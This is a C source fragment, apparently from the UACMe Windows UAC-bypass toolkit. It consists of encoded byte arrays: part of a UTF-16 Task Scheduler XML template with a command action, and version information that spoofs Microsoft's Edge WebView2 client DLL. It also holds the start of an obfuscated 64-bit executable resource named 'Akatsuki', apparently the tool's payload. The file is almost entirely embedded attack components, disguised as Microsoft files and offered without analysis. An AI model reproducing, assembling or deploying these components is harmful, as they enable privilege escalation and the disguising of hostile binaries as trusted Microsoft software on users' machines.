	0x3E, 0x00, 0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x53, 0x00,
	0x74, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x49, 0x00, 0x66, 0x00, 0x47, 0x00, 0x6F, 0x00, 0x69, 0x00,
	0x6E, 0x00, 0x67, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x42, 0x00, 0x61, 0x00, 0x74, 0x00, 0x74, 0x00,
	0x65, 0x00, 0x72, 0x00, 0x69, 0x00, 0x65, 0x00, 0x73, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x41, 0x00,
	0x6C, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x48, 0x00, 0x61, 0x00, 0x72, 0x00, 0x64, 0x00,
	0x54, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6D, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x74, 0x00,
	0x65, 0x00, 0x3E, 0x00, 0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00,
	0x41, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x48, 0x00, 0x61, 0x00, 0x72, 0x00,
	0x64, 0x00, 0x54, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6D, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x61, 0x00,
	0x74, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x53, 0x00, 0x74, 0x00, 0x61, 0x00, 0x72, 0x00,
	0x74, 0x00, 0x57, 0x00, 0x68, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x41, 0x00, 0x76, 0x00, 0x61, 0x00,
	0x69, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x62, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x66, 0x00,
	0x61, 0x00, 0x6C, 0x00, 0x73, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x53, 0x00, 0x74, 0x00,
	0x61, 0x00, 0x72, 0x00, 0x74, 0x00, 0x57, 0x00, 0x68, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x41, 0x00,
	0x76, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x62, 0x00, 0x6C, 0x00, 0x65, 0x00,
	0x3E, 0x00, 0x3C, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6E, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x6C, 0x00,
	0x79, 0x00, 0x49, 0x00, 0x66, 0x00, 0x4E, 0x00, 0x65, 0x00, 0x74, 0x00, 0x77, 0x00, 0x6F, 0x00,
	0x72, 0x00, 0x6B, 0x00, 0x41, 0x00, 0x76, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x61, 0x00,
	0x62, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x66, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x73, 0x00,
	0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6E, 0x00, 0x4F, 0x00, 0x6E, 0x00,
	0x6C, 0x00, 0x79, 0x00, 0x49, 0x00, 0x66, 0x00, 0x4E, 0x00, 0x65, 0x00, 0x74, 0x00, 0x77, 0x00,
	0x6F, 0x00, 0x72, 0x00, 0x6B, 0x00, 0x41, 0x00, 0x76, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6C, 0x00,
	0x61, 0x00, 0x62, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x49, 0x00, 0x64, 0x00,
	0x6C, 0x00, 0x65, 0x00, 0x53, 0x00, 0x65, 0x00, 0x74, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6E, 0x00,
	0x67, 0x00, 0x73, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x44, 0x00, 0x75, 0x00, 0x72, 0x00, 0x61, 0x00,
	0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x3E, 0x00, 0x50, 0x00, 0x54, 0x00, 0x31, 0x00,
	0x30, 0x00, 0x4D, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x44, 0x00, 0x75, 0x00, 0x72, 0x00, 0x61, 0x00,
	0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x57, 0x00, 0x61, 0x00,
	0x69, 0x00, 0x74, 0x00, 0x54, 0x00, 0x69, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x6F, 0x00, 0x75, 0x00,
	0x74, 0x00, 0x3E, 0x00, 0x50, 0x00, 0x54, 0x00, 0x31, 0x00, 0x48, 0x00, 0x3C, 0x00, 0x2F, 0x00,
	0x57, 0x00, 0x61, 0x00, 0x69, 0x00, 0x74, 0x00, 0x54, 0x00, 0x69, 0x00, 0x6D, 0x00, 0x65, 0x00,
	0x6F, 0x00, 0x75, 0x00, 0x74, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x53, 0x00, 0x74, 0x00, 0x6F, 0x00,
	0x70, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x49, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x45, 0x00,
	0x6E, 0x00, 0x64, 0x00, 0x3E, 0x00, 0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 0x3C, 0x00,
	0x2F, 0x00, 0x53, 0x00, 0x74, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x49, 0x00,
	0x64, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x45, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x3E, 0x00, 0x3C, 0x00,
	0x52, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x61, 0x00, 0x72, 0x00, 0x74, 0x00, 0x4F, 0x00,
	0x6E, 0x00, 0x49, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x66, 0x00, 0x61, 0x00,
	0x6C, 0x00, 0x73, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x52, 0x00, 0x65, 0x00, 0x73, 0x00,
	0x74, 0x00, 0x61, 0x00, 0x72, 0x00, 0x74, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x49, 0x00, 0x64, 0x00,
	0x6C, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x49, 0x00, 0x64, 0x00, 0x6C, 0x00,
	0x65, 0x00, 0x53, 0x00, 0x65, 0x00, 0x74, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00,
	0x73, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x41, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x77, 0x00,
	0x53, 0x00, 0x74, 0x00, 0x61, 0x00, 0x72, 0x00, 0x74, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x44, 0x00,
	0x65, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x3E, 0x00, 0x74, 0x00, 0x72, 0x00,
	0x75, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x41, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x6F, 0x00,
	0x77, 0x00, 0x53, 0x00, 0x74, 0x00, 0x61, 0x00, 0x72, 0x00, 0x74, 0x00, 0x4F, 0x00, 0x6E, 0x00,
	0x44, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x3E, 0x00, 0x3C, 0x00,
	0x45, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x62, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x64, 0x00, 0x3E, 0x00,
	0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x45, 0x00, 0x6E, 0x00,
	0x61, 0x00, 0x62, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x64, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x48, 0x00,
	0x69, 0x00, 0x64, 0x00, 0x64, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x3E, 0x00, 0x66, 0x00, 0x61, 0x00,
	0x6C, 0x00, 0x73, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x48, 0x00, 0x69, 0x00, 0x64, 0x00,
	0x64, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6E, 0x00,
	0x4F, 0x00, 0x6E, 0x00, 0x6C, 0x00, 0x79, 0x00, 0x49, 0x00, 0x66, 0x00, 0x49, 0x00, 0x64, 0x00,
	0x6C, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x66, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x73, 0x00, 0x65, 0x00,
	0x3C, 0x00, 0x2F, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6E, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x6C, 0x00,
	0x79, 0x00, 0x49, 0x00, 0x66, 0x00, 0x49, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x3E, 0x00,
	0x3C, 0x00, 0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 0x55, 0x00, 0x6E, 0x00, 0x69, 0x00, 0x66, 0x00,
	0x69, 0x00, 0x65, 0x00, 0x64, 0x00, 0x53, 0x00, 0x63, 0x00, 0x68, 0x00, 0x65, 0x00, 0x64, 0x00,
	0x75, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x45, 0x00, 0x6E, 0x00, 0x67, 0x00,
	0x69, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x66, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x73, 0x00,
	0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 0x55, 0x00, 0x6E, 0x00,
	0x69, 0x00, 0x66, 0x00, 0x69, 0x00, 0x65, 0x00, 0x64, 0x00, 0x53, 0x00, 0x63, 0x00, 0x68, 0x00,
	0x65, 0x00, 0x64, 0x00, 0x75, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x45, 0x00,
	0x6E, 0x00, 0x67, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x57, 0x00,
	0x61, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x54, 0x00, 0x6F, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6E, 0x00,
	0x3E, 0x00, 0x66, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x73, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00,
	0x57, 0x00, 0x61, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x54, 0x00, 0x6F, 0x00, 0x52, 0x00, 0x75, 0x00,
	0x6E, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x45, 0x00, 0x78, 0x00, 0x65, 0x00, 0x63, 0x00, 0x75, 0x00,
	0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x54, 0x00, 0x69, 0x00, 0x6D, 0x00, 0x65, 0x00,
	0x4C, 0x00, 0x69, 0x00, 0x6D, 0x00, 0x69, 0x00, 0x74, 0x00, 0x3E, 0x00, 0x50, 0x00, 0x54, 0x00,
	0x37, 0x00, 0x32, 0x00, 0x48, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x45, 0x00, 0x78, 0x00, 0x65, 0x00,
	0x63, 0x00, 0x75, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x54, 0x00, 0x69, 0x00,
	0x6D, 0x00, 0x65, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x6D, 0x00, 0x69, 0x00, 0x74, 0x00, 0x3E, 0x00,
	0x3C, 0x00, 0x50, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x69, 0x00, 0x74, 0x00,
	0x79, 0x00, 0x3E, 0x00, 0x37, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x50, 0x00, 0x72, 0x00, 0x69, 0x00,
	0x6F, 0x00, 0x72, 0x00, 0x69, 0x00, 0x74, 0x00, 0x79, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00,
	0x53, 0x00, 0x65, 0x00, 0x74, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x73, 0x00,
	0x3E, 0x00, 0x3C, 0x00, 0x41, 0x00, 0x63, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00,
	0x73, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x78, 0x00,
	0x74, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x41, 0x00, 0x75, 0x00, 0x74, 0x00, 0x68, 0x00, 0x6F, 0x00,
	0x72, 0x00, 0x22, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x45, 0x00, 0x78, 0x00, 0x65, 0x00, 0x63, 0x00,
	0x3E, 0x00, 0x3C, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x6E, 0x00,
	0x64, 0x00, 0x3E, 0x00
};

static const unsigned char g_encodedTaskParamEnd[69] = {
	0x3C, 0x00, 0x2F, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x6E, 0x00,
	0x64, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x45, 0x00, 0x78, 0x00, 0x65, 0x00, 0x63, 0x00,
	0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x41, 0x00, 0x63, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00,
	0x6E, 0x00, 0x73, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x54, 0x00, 0x61, 0x00, 0x73, 0x00,
	0x6B, 0x00, 0x3E, 0x00, 0x00
};

static const unsigned char g_webviewvsinfo[1224] = {
	0xC8, 0x04, 0x34, 0x00, 0x00, 0x00, 0x56, 0x00, 0x53, 0x00, 0x5F, 0x00, 0x56, 0x00, 0x45, 0x00,
	0x52, 0x00, 0x53, 0x00, 0x49, 0x00, 0x4F, 0x00, 0x4E, 0x00, 0x5F, 0x00, 0x49, 0x00, 0x4E, 0x00,
	0x46, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBD, 0x04, 0xEF, 0xFE, 0x00, 0x00, 0x01, 0x00,
	0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x53, 0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x46, 0x00,
	0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00,
	0x04, 0x04, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x34, 0x00, 0x30, 0x00, 0x39, 0x00, 0x30, 0x00,
	0x34, 0x00, 0x42, 0x00, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x2C, 0x00, 0x01, 0x00, 0x43, 0x00,
	0x6F, 0x00, 0x6D, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x79, 0x00, 0x4E, 0x00, 0x61, 0x00,
	0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00,
	0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x66, 0x00, 0x74, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6F, 0x00,
	0x72, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00,
	0x6E, 0x00, 0x00, 0x00, 0x88, 0x00, 0x5E, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00,
	0x65, 0x00, 0x44, 0x00, 0x65, 0x00, 0x73, 0x00, 0x63, 0x00, 0x72, 0x00, 0x69, 0x00, 0x70, 0x00,
	0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x69, 0x00,
	0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x66, 0x00, 0x74, 0x00, 0x20, 0x00,
	0x45, 0x00, 0x64, 0x00, 0x67, 0x00, 0x65, 0x00, 0x20, 0x00, 0x45, 0x00, 0x6D, 0x00, 0x62, 0x00,
	0x65, 0x00, 0x64, 0x00, 0x64, 0x00, 0x65, 0x00, 0x64, 0x00, 0x20, 0x00, 0x42, 0x00, 0x72, 0x00,
	0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x57, 0x00, 0x65, 0x00,
	0x62, 0x00, 0x56, 0x00, 0x69, 0x00, 0x65, 0x00, 0x77, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6C, 0x00,
	0x69, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x10, 0x00,
	0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00,
	0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00,
	0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x58, 0x00, 0x36, 0x00,
	0x01, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x61, 0x00,
	0x6C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x45, 0x00, 0x6D, 0x00,
	0x62, 0x00, 0x65, 0x00, 0x64, 0x00, 0x64, 0x00, 0x65, 0x00, 0x64, 0x00, 0x42, 0x00, 0x72, 0x00,
	0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x57, 0x00, 0x65, 0x00, 0x62, 0x00,
	0x56, 0x00, 0x69, 0x00, 0x65, 0x00, 0x77, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x6C, 0x00, 0x01, 0x00, 0x4C, 0x00, 0x65, 0x00, 0x67, 0x00,
	0x61, 0x00, 0x6C, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00,
	0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x00, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00,
	0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x20, 0x00, 0x4D, 0x00, 0x69, 0x00,
	0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x66, 0x00, 0x74, 0x00, 0x20, 0x00,
	0x43, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x61, 0x00, 0x74, 0x00,
	0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x2E, 0x00, 0x20, 0x00, 0x41, 0x00, 0x6C, 0x00, 0x6C, 0x00,
	0x20, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x73, 0x00, 0x20, 0x00,
	0x72, 0x00, 0x65, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x76, 0x00, 0x65, 0x00, 0x64, 0x00,
	0x2E, 0x00, 0x00, 0x00, 0x60, 0x00, 0x36, 0x00, 0x01, 0x00, 0x4F, 0x00, 0x72, 0x00, 0x69, 0x00,
	0x67, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00,
	0x65, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x45, 0x00, 0x6D, 0x00,
	0x62, 0x00, 0x65, 0x00, 0x64, 0x00, 0x64, 0x00, 0x65, 0x00, 0x64, 0x00, 0x42, 0x00, 0x72, 0x00,
	0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x57, 0x00, 0x65, 0x00, 0x62, 0x00,
	0x56, 0x00, 0x69, 0x00, 0x65, 0x00, 0x77, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x5E, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00,
	0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00,
	0x6F, 0x00, 0x66, 0x00, 0x74, 0x00, 0x20, 0x00, 0x45, 0x00, 0x64, 0x00, 0x67, 0x00, 0x65, 0x00,
	0x20, 0x00, 0x45, 0x00, 0x6D, 0x00, 0x62, 0x00, 0x65, 0x00, 0x64, 0x00, 0x64, 0x00, 0x65, 0x00,
	0x64, 0x00, 0x20, 0x00, 0x42, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x65, 0x00,
	0x72, 0x00, 0x20, 0x00, 0x57, 0x00, 0x65, 0x00, 0x62, 0x00, 0x56, 0x00, 0x69, 0x00, 0x65, 0x00,
	0x77, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x10, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00,
	0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00,
	0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00,
	0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x14, 0x00, 0x01, 0x00, 0x43, 0x00,
	0x6F, 0x00, 0x6D, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x79, 0x00, 0x53, 0x00, 0x68, 0x00,
	0x6F, 0x00, 0x72, 0x00, 0x74, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00,
	0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x66, 0x00,
	0x74, 0x00, 0x00, 0x00, 0x88, 0x00, 0x5E, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00,
	0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x53, 0x00, 0x68, 0x00, 0x6F, 0x00, 0x72, 0x00,
	0x74, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x69, 0x00,
	0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x66, 0x00, 0x74, 0x00, 0x20, 0x00,
	0x45, 0x00, 0x64, 0x00, 0x67, 0x00, 0x65, 0x00, 0x20, 0x00, 0x45, 0x00, 0x6D, 0x00, 0x62, 0x00,
	0x65, 0x00, 0x64, 0x00, 0x64, 0x00, 0x65, 0x00, 0x64, 0x00, 0x20, 0x00, 0x42, 0x00, 0x72, 0x00,
	0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x57, 0x00, 0x65, 0x00,
	0x62, 0x00, 0x56, 0x00, 0x69, 0x00, 0x65, 0x00, 0x77, 0x00, 0x20, 0x00, 0x43, 0x00, 0x6C, 0x00,
	0x69, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x04, 0x00,
	0x01, 0x00, 0x4F, 0x00, 0x66, 0x00, 0x66, 0x00, 0x69, 0x00, 0x63, 0x00, 0x69, 0x00, 0x61, 0x00,
	0x6C, 0x00, 0x20, 0x00, 0x42, 0x00, 0x75, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x64, 0x00, 0x00, 0x00,
	0x31, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x00, 0x61, 0x00, 0x72, 0x00,
	0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x04, 0x00, 0x00, 0x00, 0x54, 0x00, 0x72, 0x00, 0x61, 0x00,
	0x6E, 0x00, 0x73, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x09, 0x04, 0xB0, 0x04
};
// AppendResources - BuildUACME

#ifdef _WIN64
static const unsigned char g_resourceAkatsuki64[11264] = {
	0xE6, 0xF1, 0x3B, 0xAB, 0xA8, 0xAB, 0xAB, 0xAB, 0xAF, 0xAB, 0xAB, 0xAB, 0x54, 0x54, 0xAB, 0xAB,
	0x13, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xEB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB,
	0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB,
	0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0x43, 0xAB, 0xAB, 0xAB,
	0xA5, 0xB4, 0x11, 0xA5, 0xAB, 0x1F, 0xA2, 0x66, 0x8A, 0x13, 0xAA, 0xE7, 0x66, 0x8A, 0xFF, 0xC3,
	0xC2, 0xD8, 0x8B, 0xDB, 0xD9, 0xC4, 0xCC, 0xD9, 0xCA, 0xC6, 0x8B, 0xC8, 0xCA, 0xC5, 0xC5, 0xC4,
	0xDF, 0x8B, 0xC9, 0xCE, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
	0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x7F, 0x08, 0x41, 0x8B, 0x3B, 0x69, 0x2F, 0xD8, 0x3B, 0x69, 0x2F, 0xD8, 0x3B, 0x69, 0x2F, 0xD8,
	0xBC, 0xE0, 0x2C, 0xD9, 0x3A, 0x69, 0x2F, 0xD8, 0xBC, 0xE0, 0x2B, 0xD9, 0x3A, 0x69, 0x2F, 0xD8,
	0x4F, 0xE8, 0x2E, 0xD9, 0x32, 0x69, 0x2F, 0xD8, 0x3B, 0x69, 0x2E, 0xD8, 0x6D, 0x69, 0x2F, 0xD8,
	0xB5, 0xE0, 0x27, 0xD9, 0x34, 0x69, 0x2F, 0xD8, 0xB5, 0xE0, 0x2F, 0xD9, 0x3A, 0x69, 0x2F, 0xD8,
